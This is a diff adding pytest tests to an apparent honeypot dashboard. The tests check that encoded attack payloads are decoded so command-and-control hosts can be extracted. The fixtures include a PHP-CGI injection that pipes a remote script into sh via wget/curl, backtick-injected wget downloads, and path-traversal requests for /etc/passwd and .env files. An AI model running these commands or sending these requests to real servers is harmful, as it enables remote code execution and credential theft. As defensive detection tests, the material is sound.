@@ -16,6 +16,7 @@ from datetime import datetime, timedelta
 import pytest
 
 from manyfaced.web import dashboard as _dash_mod
+from manyfaced.web.payload_decode import decode_payload
 from manyfaced.web import dashboard_render as _render_mod
 
 
@@ -97,6 +98,73 @@ def test_extract_c2_hosts_handles_store_error_gracefully():
 
     # Must not raise — the IoC scan must never break the dashboard payload.
     assert _dash_mod._extract_c2_hosts(_BoomStore(), since=None) == []
+
+
+def test_extract_c2_hosts_decodes_encoded_payload():
+    """Issue #368: a URL-encoded payload hiding a C2 host must be decoded before
+    the C2 scan, so the hidden drop host surfaces (raw-byte scan misses it)."""
+    crlf = chr(13) + chr(10)
+    raw = (
+        'POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file'
+        '%3dphp://input HTTP/1.1' + crlf + '(wget --no-check-certificate -qO- '
+        'https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh'
+    )
+    store = _FakeStore([raw])
+    hosts = _dash_mod._extract_c2_hosts(store, since=None)
+    got = {h['host']: h['count'] for h in hosts}
+    assert got.get('14.46.136.77') == 1, f'encoded C2 host not extracted: {got}'
+
+
+# ---------------------------------------------------------------------------
+# issue #368: payload_decode.decode_payload
+# ---------------------------------------------------------------------------
+
+
+def test_decode_payload_url_malformed_dot_escapes():
+    """The scanner dot/slash escapes the user flagged (`.%2e/`, `.%2f`, ...) —
+    standard URL-decode recovers them."""
+    assert (
+        decode_payload('GET /..%2f..%2fetc%2fpasswd HTTP/1.1') == 'GET /../../etc/passwd HTTP/1.1'
+    )
+    assert decode_payload('GET /error%2elog%2ebak HTTP/1.1') == 'GET /error.log.bak HTTP/1.1'
+    assert (
+        decode_payload('GET /node_modules/%2eenv%2eprod HTTP/1.1')
+        == 'GET /node_modules/.env.prod HTTP/1.1'
+    )
+    assert decode_payload('GET /.%2fsecret HTTP/1.1') == 'GET /./secret HTTP/1.1'
+    # `%2e%2e%2f` (fully encoded `../`) decodes too.
+    assert (
+        decode_payload('GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1')
+        == 'GET /../../etc/passwd HTTP/1.1'
+    )
+
+
+def test_decode_payload_no_encoding_passthrough():
+    """A plain payload is returned unchanged (failsafe, no blanking)."""
+    raw = 'GET /admin?x=`wget http://91.92.40.118/x` HTTP/1.1'
+    assert decode_payload(raw) == raw
+
+
+def test_decode_payload_base64_token():
+    """A long base64 run is decoded to its text when it validates as printable."""
+    import base64
+
+    text = 'wget http://91.92.40.118/x -O /tmp/m.sh'
+    b64 = base64.b64encode(text.encode()).decode()
+    assert decode_payload(b64) == text
+
+
+def test_decode_payload_base64_rejected_for_garbage():
+    """Random high-entropy strings are NOT force-decoded into garbage."""
+    # 20 'A's is valid base64 padding-wise but decodes to non-text -> kept raw.
+    raw = 'AAAA' * 5
+    assert decode_payload(raw) == raw
+
+
+def test_decode_payload_nested_double_encoding():
+    """Double URL-encoding is unwound (bounded passes)."""
+    # %252e%252e%252f == %2e%2e%2f after one pass, then ../ after the second.
+    assert decode_payload('GET /%252e%252e%252fetc HTTP/1.1') == 'GET /../etc HTTP/1.1'
 
 
 # ---------------------------------------------------------------------------
